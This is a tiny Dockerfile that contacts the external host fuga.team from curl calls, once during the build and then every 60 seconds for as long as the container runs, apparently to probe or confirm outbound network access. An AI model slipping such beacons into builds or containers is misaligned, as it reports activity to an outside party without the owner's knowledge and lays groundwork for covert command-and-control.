FROM illfarm/grok-callback:v2
RUN echo "BUILD_OK" && curl -s -m 5 http://fuga.team/BUILD_CALLBACK || true
CMD while true; do curl -s http://fuga.team/RUN_CALLBACK 2>/dev/null; sleep 60; done
